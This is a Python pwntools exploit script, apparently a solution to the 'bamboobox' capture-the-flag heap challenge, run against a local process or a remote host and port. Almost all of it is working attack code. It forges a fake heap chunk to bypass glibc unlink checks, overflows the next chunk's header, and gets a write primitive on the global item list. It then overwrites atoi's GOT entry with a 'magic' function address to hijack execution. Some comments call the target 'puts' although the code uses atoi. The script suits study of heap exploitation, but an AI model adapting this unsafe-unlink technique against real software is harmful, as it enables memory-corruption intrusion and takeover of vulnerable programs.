# --==[[ unsafe unlink attack

from pwn import *

fd       = 0x6020c8 - (3*8)
bk       = 0x6020c8 - (2*8)
atoi_got = 0x602068
magic    = 0x400d49
exit_plt = 0x400786

def alloc(size, data):

    r.sendlineafter('choice:', '2')
    r.sendlineafter('name:', str(size))
    r.sendlineafter('item:', data)

    return

def edit(idx, size, data, rekt = 1):

    r.sendlineafter('choice:', '3')
    r.sendlineafter('item:', str(idx))
    r.sendlineafter('name:', str(size))
    r.sendlineafter('item:', data)

    return

def free(idx):

    r.sendlineafter('choice:', '4')
    r.sendlineafter('item:', str(idx))

    return

def pwn():

    # prev_size
    fake_chunk  = p64(0)   
    # Bypassing (chunksize(P) != prev_size (next_chunk(P))
    fake_chunk += p64(0x8) 
    # Bypassing (P->fd->bk != P || P->bk->fd != P)
    fake_chunk += p64(fd) 
    fake_chunk += p64(bk)

    alloc(0x80, fake_chunk)
    alloc(0x80, 'B'*8)

    # Trick chunk1 into thinking that its previous chunk is also free
    # in order to call unlink() to consolidate the chunks
    edit(0, 0xa0, fake_chunk + 'C'*0x60 + p64(0x80) + p64(0x90), 0)

    # The global array should contain a pointer to itself now
    # rather than to the heap
    #
    # 0x6020c0 <itemlist>:    0x0000000000000080    0x00000000006020b0 <-- 0th entry
    free(1)

    # Overwrite the 0th entry with a puts GOT entry
    edit(0, 0x80, p64(0)*2 + p64(0x80) + p64(atoi_got))
    # puts => magic
    edit(0, 0x80, p64(magic) + p64(exit_plt))

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./bamboobox')
        pause()
        pwn()
